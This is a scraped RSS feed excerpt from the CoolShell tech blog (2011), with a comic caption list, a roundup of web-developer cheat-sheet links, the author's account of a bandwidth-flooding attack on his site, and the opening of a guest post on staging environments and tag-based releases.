<a href="https://coolshell.cn/articles/8209.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8209.html" class="wp_rp_title">“单元测试要做多细？”</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5531.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5531.html" class="wp_rp_title">Test-Driven Development？别逗了</a>
</li>
<li>
<a href="https://coolshell.cn/articles/5143.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/5143.html" class="wp_rp_title">在新浪微博上关于敏捷的一些讨论</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4891.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4891.html" class="wp_rp_title">Bob大叔和Jim Coplien对TDD的论战</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3778.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3778.html" class="wp_rp_title">敏捷水管工</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3745.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3745.html" class="wp_rp_title">再谈敏捷和ThoughtWorks中国咨询师</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3649" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="ad1da40600">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>33</strong> 人打了分，平均分： <strong>4.24</strong> )<br><span class="post-ratings-text" id="ratings_3649_text"></span><meta itemprop="name" content="TDD并不是看上去的那么美">
<meta itemprop="headline" content="TDD并不是看上去的那么美">
<meta itemprop="description" content="春节前的一篇那些炒作过度的技术和概念中对敏捷和中国ThoughtWorks的微辞引发了很多争议，也惊动了中国ThoughtWorks公司给我发来了邮件想来找我当面聊聊。对于Agile的Fans们，意料之中地也对我进行了很多质疑和批评。我也回复了许多评论。不过，我的那些回复都是关于中国ThoughtWorks咨询师以及其咨询的方法的。我对Agile方法论中的具体内容评价的不是很多，所以，我想不妨讨论...">
<meta itemprop="datePublished" content="2011-02-12T08:48:16+08:00">
<meta itemprop="dateModified" content="2011-02-12T12:57:01+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3649.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3649.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.24">
<meta itemprop="ratingCount" content="33">
</div>
</div>
<div id="post-ratings-3649-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-12T08:48:16+08:00</pubDate>
<guid>https://coolshell.cn/articles/3649.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 为啥搞电脑的会有这么多空闲时间？ ]]></title>
<link>https://coolshell.cn/articles/3672.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2011/02/reasons_why_people_who_work_with_computers_seem_to_have_a_lot_of_spare_time.png"><img alt="image placeholder" ></a></p>
<p>解释一下：</p>
<p><span id="more-3672"></span></p>
<ul>
<li>Web程序员—— “正在上传中……”</li>
<li>系统管理员——“正在启动中……”</li>
<li>黑客——“黑客脚本放出去了……”</li>
<li>3D动画制作——“正在渲染中……”</li>
<li>咨询顾问——“现在是你的问题了……”</li>
<li>程序员——“正在编译中……”</li>
</ul>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/21589.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/21589.html" class="wp_rp_title">如何做一个有质量的技术分享</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20977.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20977.html" class="wp_rp_title">程序员如何把控自己的职业</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20765.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20765.html" class="wp_rp_title">MegaEase的远程工作文化</a>
</li>
<li>
<a href="https://coolshell.cn/articles/20276.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/20276.html" class="wp_rp_title">别让自己“墙”了自己</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19612.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19612.html" class="wp_rp_title">50年前的登月程序和程序员有多硬核</a>
</li>
<li>
<a href="https://coolshell.cn/articles/19464.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/19464.html" class="wp_rp_title">如何超过大多数人</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3672" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="ce9ce71846">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>15</strong> 人打了分，平均分： <strong>4.40</strong> )<br><span class="post-ratings-text" id="ratings_3672_text"></span><meta itemprop="name" content="为啥搞电脑的会有这么多空闲时间？">
<meta itemprop="headline" content="为啥搞电脑的会有这么多空闲时间？">
<meta itemprop="description" content="

解释一下：



	Web程序员—— “正在上传中……”
	系统管理员——“正在启动中……”
	黑客——“黑客脚本放出去了……”
	3D动画制作——“正在渲染中……”
	咨询顾问——“现在是你的问题了……”
	程序员——“正在编译中……”
">
<meta itemprop="datePublished" content="2011-02-12T18:03:11+08:00">
<meta itemprop="dateModified" content="2011-02-12T18:05:47+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3672.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3672.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.4">
<meta itemprop="ratingCount" content="15">
</div>
</div>
<div id="post-ratings-3672-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-12T18:03:11+08:00</pubDate>
<guid>https://coolshell.cn/articles/3672.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Web开发人员速查卡 ]]></title>
<link>https://coolshell.cn/articles/3684.html</link>
<content><![CDATA[ 
<p>无论你是多牛的程序员，你都无法记住所有的东西。而很多时候，查找某些知识又比较费事。所以，网上有很多Cheat Sheets，翻译成小抄也好 ，速查卡也好，总之就是帮你节省 时间的。之前给大家介绍过<a rel="bookmark" href="https://coolshell.cn/articles/870.html" target="_blank">Web设计的速查卡</a>、<a rel="bookmark" href="https://coolshell.cn/articles/2964.html" target="_blank">25个jQuery的编程小抄</a>，还有<a rel="bookmark" href="https://coolshell.cn/articles/1566.html" target="_blank">程序员小抄大全</a>，今天转一篇开发人员的速查卡，<a href="http://www.topdesignmag.com/all-the-cheat-sheets-that-a-web-developer-needs/" target="_blank">源文在这里</a>。下面的文章我就不翻译了。</p>
<h2>HTML Cheat Sheet</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.html.su/" target="_blank">HTML/XTML in one page</a></li>
<li><a href="http://refcardz.dzone.com/refcardz/html5-new-standards-web-interactivity" target="_blank">HTML5: The Evolution of Web Standards by James Sugrue</a></li>
<li><a href="http://www.elizabethcastro.com/html/extras/xhtml_ref.html" target="_blank">(X)HTML Elements and Attributes</a></li>
<li><a href="https://www.w3.org/QA/2002/04/valid-dtd-list.html" target="_blank">Doctype Declarations (DTDs)</a></li>
<li><a href="http://www.digitalmediaminute.com/reference/entity/index.php" target="_blank">XHTML Character Entity Reference</a></li>
<li><a href="http://downloads.gosquared.com/help_sheets/08/HTML-Help-Sheet-02.jpg" target="_blank">GoSquared HTML Help Sheet</a></li>
</ul>
<p><span id="more-3684"></span></p>
<p><strong> </strong></p>
<h2>CSS Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.css.su/" target="_blank">CSS in one page</a></li>
<li><a href="http://www.elizabethcastro.com/html/extras/cssref.html" target="_blank">CSS Properties and Values</a></li>
<li><a href="http://www.blooberry.com/indexdot/css/propindex/all.htm" target="_blank">All CSS Properties Listed Alphabetically</a></li>
<li><a href="http://www.dustindiaz.com/css-shorthand/" target="_blank">CSS Shorthand Guide</a></li>
<li><a href="https://www.gosquared.com/liquidicity/archives/1010" target="_blank">GoSquared CSS Help Sheet</a></li>
</ul>
<h2>Adobe Flash Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://michaeldoyle.eu/blog/wp-content/uploads/2009/10/flash-cheat-sheet.pdf" target="_blank">Flash Cheat Sheet</a></li>
<li><a href="http://edutechwiki.unige.ch/en/Flash_CS3_keyboard_shortcuts" target="_blank">Flash CS3 Keyboard Shortcuts</a></li>
</ul>
<p><strong> </strong></p>
<h2><strong>ASP Cheat Sheets</strong></h2>
<h2><strong><img alt="image placeholder" ><br>
</strong></h2>
<ul>
<li><a href="http://refcardz.dzone.com/refcardz/core-aspnet" target="_blank">Core ASP.NET</a></li>
<li><a href="http://www.newdrp.com/Posters/Development/tabid/67/id/284/Default.aspx" target="_blank">ASP.NET MVC Framework Cheat Sheet</a></li>
<li><a href="http://www.newdrp.com/Posters/Development/tabid/67/id/286/Default.aspx" target="_blank">ASP.NET MVC View Cheat Sheet</a></li>
</ul>
<h2>PHP Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.dreamincode.net/forums/topic/35660-php-quick-reference-cheat-sheet/" target="_blank">PHP Basics Quick Reference Sheet</a></li>
<li><a href="http://www.digilife.be/quickreferences/QRC/PHP%20Cheat%20Sheet.pdf" target="_blank">PHP Cheat Sheet</a></li>
<li><a href="http://www.sk89q.com/content/2010/04/phpsec_cheatsheet.pdf" target="_blank">PHP Security Cheat Sheet</a></li>
<li><a title="PHP Variable and Array Tests (php version 5.1.6) by Barry Hunter" href="http://www.deformedweb.co.uk/php_variable_tests.php" target="_blank">PHP Variable and Array Tests</a></li>
<li><a href="http://downloads.gosquared.com/help_sheets/08/PHP-Help-Sheet-01.jpg" target="_blank">GoSquared PHP Help Sheet</a></li>
</ul>
<h2>MySQL Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.addedbytes.com/cheat-sheets/mysql-cheat-sheet/" target="_blank">MySQL Cheat Sheet by Dave Child</a></li>
<li><a href="http://www.cheat-sheets.org/saved-copy/MySQL_QuickRef.pdf" target="_blank">MySQL Database Quick Reference</a></li>
<li><a href="http://www.sqltutorial.org/sql-cheat-sheet.aspx" target="_blank">SQL Statements Cheat Sheet</a></li>
</ul>
<h2>JavaScript Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.javascript.su/" target="_blank">JavaScript in one page</a></li>
<li><a href="http://www.addedbytes.com/cheat-sheets/javascript-cheat-sheet/" target="_blank">JavaScript Cheat Sheet</a></li>
<li><a href="http://wps.aw.com/wps/media/objects/2234/2287950/javascript_refererence.pdf" target="_blank">Addison-Wesley’s JavaScript Reference Card</a></li>
</ul>
<h2>jQuery Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://colorcharge.com/jquery/" target="_blank">jQuery Cheatsheet</a></li>
<li><a href="https://woork.blogspot.com/2009/09/jquery-visual-cheat-sheet.html" target="_blank">jQuery 1.3 Visual Cheat Sheet by Antonio Lupetti</a></li>
<li><a href="http://refcardz.dzone.com/refcardz/jquery-selectors" target="_blank">jQuery Selectors by Bear Bibeault &amp; Yehuda Katz</a></li>
</ul>
<h2>Unicode Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.utf.ru/" target="_blank">The Unicode Character Code</a></li>
<li><a href="http://www.visibone.com/htmlref/char/cer.htm" target="_blank">HTML Characters, Numeric Codes, 0-65535 by Bob Stein</a></li>
</ul>
<h2>XML Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.xml.su/" target="_blank">XML in one page</a></li>
<li><a href="http://www.mulberrytech.com/quickref/XMLquickref.pdf" target="_blank">XML 1.0 Syntax Quick Reference by Mulberry Technologies</a></li>
</ul>
<h2>mod_rewrite and .htaccess Cheat Sheets</h2>
<p><img alt="image placeholder" ></p>
<ul>
<li><a href="http://www.addedbytes.com/cheat-sheets/mod_rewrite-cheat-sheet/" target="_blank">mod_rewrite Cheat Sheet by Dave Child</a></li>
<li><a href="http://www.thejackol.com/htaccess-cheatsheet/" target="_blank">htaccess Cheatsheet</a></li>
</ul>
<p>（全文完）</p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/4795.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4795.html" class="wp_rp_title">开源中最好的Web开发的资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1949.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1949.html" class="wp_rp_title">Web中的省略号</a>
</li>
<li>
<a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6840.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6840.html" class="wp_rp_title">CSS 布局:40个教程、技巧、例子和最佳实践</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3684" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="f4939afdad">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>12</strong> 人打了分，平均分： <strong>4.25</strong> )<br><span class="post-ratings-text" id="ratings_3684_text"></span><meta itemprop="name" content="Web开发人员速查卡">
<meta itemprop="headline" content="Web开发人员速查卡">
<meta itemprop="description" content="无论你是多牛的程序员，你都无法记住所有的东西。而很多时候，查找某些知识又比较费事。所以，网上有很多Cheat Sheets，翻译成小抄也好 ，速查卡也好，总之就是帮你节省 时间的。之前给大家介绍过Web设计的速查卡、25个jQuery的编程小抄，还有程序员小抄大全，今天转一篇开发人员的速查卡，源文在这里。下面的文章我就不翻译了。
HTML Cheat Sheet


	HTML/XTML ...">
<meta itemprop="datePublished" content="2011-02-16T18:59:06+08:00">
<meta itemprop="dateModified" content="2011-02-17T21:44:26+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3684.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3684.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.25">
<meta itemprop="ratingCount" content="12">
</div>
</div>
<div id="post-ratings-3684-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-16T18:59:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/3684.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 欢迎攻击酷壳 ]]></title>
<link>https://coolshell.cn/articles/3686.html</link>
<content><![CDATA[ 
<p><span style="font-size: 11pt;"><span style="color: #800000;">相信大家都发现昨天下午2011年2月16日，下午从2点到6点，酷壳基本打不开。原因是服务器受到了黑客攻击。从互联网上几乎ping不通服务器（丢包率60%以上，ping时延巨大，是平时的10倍以上），我勉强登上服务器查看了系统负载，相当低，于是停止了Apache，发现网络ping马上恢复正常。于是，我启动Apache，再使用iftop查看了一下TCP链接的带宽消耗，发现有那么一两个链接把服务器带宽全部吃完，于是我记录了下IP地址。攻击在下午6点时准停止，就像我们正常下班一样。</span></span></p>
<p><span style="font-size: 11pt;"><span style="color: #800000;">酷壳受到很多攻击，不过，基本上都是一些注入式的攻击，都是想取得一些权限的攻击。这是第一次受到不以取得权限为目的，而只在以影响酷壳正常运转的攻击。</span></span></p>
<p><span style="font-size: 11pt;"><span style="color: #800000;">我不竟想到了几个问题：</span></span></p>
<ol>
<li><span style="font-size: 11pt;"><span style="color: #800000;">为什么要攻击？这只是一个技术blog，这样的攻击目的是什么？</span></span></li>
<li><span style="font-size: 11pt;"><span style="color: #800000;">黑客攻击的背后总是有相关的利益冲突的，不会是没有动机的攻击。</span></span></li>
</ol>
<p><span style="font-size: 11pt;"><span style="color: #800000;">所以，我一直在想，是什么样的利益冲突导到酷壳被攻击的？这个BLOG得罪了谁呢？我这个小小的个人的BLOG触动了谁的利益呢？任何事情总是有因果关系的，我很不自然地想到了最近我发布的几篇文章……</span></span></p>
<p><span style="font-size: 11pt;"><span style="color: #800000;">欢迎攻击酷壳！我很乐意看到某些人生气的样子。</span></span></p>
<p><span style="font-size: 11pt;"><span style="color: #800000;"><span id="more-3686"></span><br>
</span></span></p>
<blockquote cite="#commentbody-30044">
<p><strong><a href="#comment-30044">陈皓</a> :</strong></p>
<p>谢谢大家的关心。没关系，攻击就攻击吧，攻击这里没有任何的价值。因为，</p>
<ul>
<li>我这里又不挣钱，我个人也没钱，这个网站又没有什么商业运作，我也不图利，所以从这图利是图不到的。</li>
<li>这里的文章RSS输出到很多地方，如GR，douban，有道，鲜果，抓虾……，就算是这里不能正常运转，也不妨碍大家阅读文章。</li>
</ul>
<p>所以，<strong>黑客同学，你即不能从这里获利，也不能阻止大家看文章，更不能左右大家的想法。而且黑客行为是刑事犯罪，你即得不到任何好处，还要背上那么大的风险，何必呢？</strong>（我相信黑客同学既然有智商能够使用黑客技术，那一定有智商搞清楚这个问题）</p>
</blockquote>
<p></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/8031.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8031.html" class="wp_rp_title">InfoQ的ArchSummit大会对我的采访</a>
</li>
<li>
<a href="https://coolshell.cn/articles/6639.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/6639.html" class="wp_rp_title">千万别惹程序员 </a>
</li>
<li>
<a href="https://coolshell.cn/articles/4826.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4826.html" class="wp_rp_title">GNU/Linux下有多少是GNU的？</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1640.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1640.html" class="wp_rp_title">文件备份的几个简单命令</a>
</li>
<li>
<a href="https://coolshell.cn/articles/2365.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/2365.html" class="wp_rp_title">两个C++的资源</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1751.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1751.html" class="wp_rp_title">Go 语言：Google 的新编程语言</a>
</li>
</ul>
</div></div>
<div id="post-ratings-3686" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="64399fabb0">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>26</strong> 人打了分，平均分： <strong>4.42</strong> )<br><span class="post-ratings-text" id="ratings_3686_text"></span><meta itemprop="name" content="欢迎攻击酷壳">
<meta itemprop="headline" content="欢迎攻击酷壳">
<meta itemprop="description" content="相信大家都发现昨天下午2011年2月16日，下午从2点到6点，酷壳基本打不开。原因是服务器受到了黑客攻击。从互联网上几乎ping不通服务器（丢包率60%以上，ping时延巨大，是平时的10倍以上），我勉强登上服务器查看了系统负载，相当低，于是停止了Apache，发现网络ping马上恢复正常。于是，我启动Apache，再使用iftop查看了一下TCP链接的带宽消耗，发现有那么一两个链接把服务器带宽全...">
<meta itemprop="datePublished" content="2011-02-17T10:03:28+08:00">
<meta itemprop="dateModified" content="2011-02-17T22:47:19+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/3686.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/3686.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.42">
<meta itemprop="ratingCount" content="26">
</div>
</div>
<div id="post-ratings-3686-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-02-17T10:03:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/3686.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 预发布环境,Tag发布机制和可重复的部署过程 ]]></title>
<link>https://coolshell.cn/articles/3709.html</link>
<content><![CDATA[ 
<p><span style="font-size: 11pt;"><strong>下面文章由网友<a href="http://blog.lvscar.info/" target="_blank">吕毅</a>投递，源文是：<a href="http://blog.lvscar.info/?p=427" target="_blank">http://blog.lvscar.info/?p=427</a></strong></span></p>
<p>—————————————————————————————————————————————</p>
<p>周末聚会，无意间聊起建筑行业。自己是搞软件开发的，我们的行业从建筑设计/施工过程中借鉴了大量的概念，隐喻，名词。可以说软件就是现实中伴随整个人类历史发展的“建筑”在虚拟空间中的投影。有个两年前问过其他朋友的问题，这次友人又再次提起，“为什么建筑设计过程中没有普遍性的采用版本控制呢？” 瞎扯了一干各种原因后，我们几乎同时想到一个名字”Joel”，建筑设计行业或许缺乏像<a href="http://www.joelonsoftware.com/">Joel Spolsky</a>一样十数年如一日，把自己丰富的经验和深入的思考转化成一篇篇文章以向新人传授软件开发过程中那些容易被忽略的概念。高傲的黑客们会对CMMI之类的认证抱以鄙夷之情，但对Joel整理出的12条写出更好软件的”最佳实践”，大家甚至把此称为审视其他团队开发过程的<a href="http://www.joelonsoftware.com/articles/fog0000000043.html">“Joel TEST”</a>以推崇</p>
<p>这12条测试如下:</p>
<blockquote>
<p>1. 是否启用版本控制？</p>
<p>2. 是否可以一步构建?</p>
<p>3. 是否进行每日构建？</p>
<p>4. 是否有bug跟踪列表？</p>
<p>5. 是否在修改bug后，才开始写新代码？</p>
<p>6. 是否及时更新工作计划？</p>
<p>7. 是否在开发前编写了大家一致认可的功能文档？</p>
<p>8. 是否有安静的工作环境？</p>
<p>9. 是否在使用最好的软件开发工具？</p>
<p>10.是否有专职测试人员？</p>
<p>11.是否在面试时以实际编写代码来检查求职者？</p>
<p>12.是否利用陌生人进行可用性测试？</p>
</blockquote>
<p>你所在的团队符合其中的几条呢？ 觉得这些条目太一般，软件开发原本就该如此？ Joel Test写于十年前，一个Windows XP，Mac OS X,Ubuntu都还没有面世的年代。 如果你觉得这些条目有些过时了，Google中搜索“Joel Test”，你可以看到这十年内很多对此进行更新的尝试, 比如这两个页面<a href="http://geekswithblogs.net/btudor/archive/2009/06/16/132842.aspx">“The Joel Test Update for 2010″</a>,<a href="http://allinthehead.com/retro/228/">“Joel Test for web dev”</a>.</p>
<p><span id="more-3709"></span></p>
<p>我的主要工作集中在”Web/Mobile Web”领域，在”Joel Test”写就的年代，Web技术仅仅是一些用记事本就能写出的Html页面。但到了今天，到了经历过BS浪潮,后端编程语言井喷涌现，Ajax和HTML5变得人人皆知的今天。Web技术已经变成了一个由N种后端技术*N种开发语言/框架*N种前端技术交织起来的复杂体系。Web 程序员们觉得Joel开出的列表仍然有价值,那是因为我们的大部分工作仍然延续着上一代程序员们开创的轨迹；我们仍然在通过程序代码释创造力同时避免BUG的出现;我们仍然得谨慎的在强大,华丽与高效之间做着权衡. 相比客户端,Web技术最大的优势在于部署成本的节省,我们的程序和Joel年代最大的区别也在于此。这一年来新的工作岗位让我学到了很多,部署过程正是其中我觉得最值得和大家分享的部分.</p>
<p>下面这个列表来自前阵子看到的一篇很好的文章<a href="http://www.kalzumeus.com/2010/12/12/staging-servers-source-control-deploy-workflows-and-other-stuff-nobody-teaches-you/">Staging Servers, Source Control &amp; Deploy Workflows, And Other Stuff Nobody Teaches You</a>,标题中的列出的三项和我的体会高度吻合,下面我会对他们一一做出自己的诠释</p>
<blockquote>
<p>1.是否采用了预发布环境</p>
<p>2.是否以Tag作为发布单位</p>
<p>3.是否让部署过程是可重复的</p>
</blockquote>
<div>
<h3>是否采用了预发布环境</h3>
<p>关于测试驱动开发的鼓吹中,”免除对代码修改的恐惧”十分具有诱惑力.我们都不喜欢功能逐渐丰富过程中冷不防出现的各种BUG,这些BUG打乱我们的计划,破坏我们的心情,从而让我们对开发新功能的旅程心存恐惧.TDD的最大魅力也来自于通过测试先行来保证后续的功能扩展相对于预期是可验证的. 不过无论你的WEB开发过程是怎样的,最终的代码和内容还是要通过发布来送达到用户浏览器中,你可以对PK需求,修改BUG,延长加班毫无畏惧,但你不能忽略用户体验.代码一旦部署到正式环境上,对你工作的评判不再是项目组中关心你,体谅你的同事.而是千万对错误零容忍的用户. 在发布前你已经做过周全的测试? 新增的每一项功能已经测试过? 很好.不过是在你的开发环境或某处偏僻的”测试环境”中? 服务器OS不一样,Web Server有差别,缓存服务未启用,APP容器或解释器,数据库版本有差别,没接通第三方API, 这所有的一切都可能会造成发布后,你自己或用户刷新网站后的那声”What The fuck?”, 我想这应该是较之修改BUG,你更不想面对的情景吧.</p>
<p>总的说来,”预发布环境”就等于没有真实用户访问的生产环境, 除了让用户不能访问到外,尽一切可能让这个环境和生产环境一致.每次正式发布时以这个环境为目标,测试流程完成后.把发布内容从这个环境”平移”到生产环境.</p>
</div>
<div>
<h3>是否以Tag作为发布单位</h3>
